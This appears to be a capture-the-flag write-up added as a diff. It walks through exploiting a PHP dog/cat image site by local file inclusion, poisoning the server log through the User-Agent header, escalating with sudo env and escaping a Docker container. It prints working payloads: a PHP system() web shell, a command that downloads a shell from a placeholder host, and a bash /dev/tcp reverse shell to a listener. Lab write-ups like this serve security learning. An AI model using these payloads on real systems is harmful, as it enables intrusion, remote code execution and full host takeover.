@@ -1,0 +1,57 @@
+basic enum doesnt show much, except for a site that has two choices, showing a pic of a dog or a cat
+
+the key here was the URL:
+
+“/?view=dog” and “/?view=cat”
+
+After few minutes of fiddling we find out that:
+
+- there are files called “dog.php” and “cat.php” that return a random image
+- the “?view=” query runs “include” on our parameter only if the word “dog” or “cat” is present
+- the file automatically appends .php to our parameter
+- php base64 filter is working on this query
+
+“/?view=php://filter/read=convert.base64-encode/resource=./dog/../index”
+
+this got me the index site, which revealed more info on how the php site works
+
+LOG POISONING
+
+[Get Reverse Shell Through Log Poisoning with the Vulnerability of - LFI ( LOCAL FILE INCLUSION )](https://dheerajdeshmukh.medium.com/get-reverse-shell-through-log-poisoning-with-the-vulnerability-of-lfi-local-file-inclusion-e504e2d41f69)
+
+log poisoning in this case was sending a CURL request with simple php payload as user agent
+
+so when the server is parsing the log output it also executes supplied command 
+
+`curl "[http://10.10.115.128/](http://10.10.115.128/)" -H "User-Agent: <?php system(\$_GET['c']); ?>"`
+
+or
+
+`curl “http://10.10.155.128” -H "User-Agent:<?php file_put_contents('shell.php', file_get_contents('http://[your-host]/shell.php'))?>"`
+
+for the second one we need to host a python webserver, and it will pull a revshell file and output it to a file on the server
+
+otherwise, we need to curl the file using the `c` parameter supplied in the first payload
+
+so after the shell, sudo -l reveals a oneline privesc:
+
+`(root) NOPASSWD: /usr/bin/env`
+
+leverage it with:
+
+`sudo env /bin/sh`
+
+this gets us a root shell on the box, but we are in a docker env
+
+docker escape:
+
+[Escaping Containers to Execute Commands on Play with Docker Servers](https://www.bleepingcomputer.com/news/security/escaping-containers-to-execute-commands-on-play-with-docker-servers/)
+
+it was as easy as discovering a /opt/backup.sh file:
+
+```
+echo "#!/bin/bash" > backup.sh
+echo "/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/1234 0>&1'" >> backup.sh
+```
+
+after setting up a listener this gets us a root reverse shell from the host box
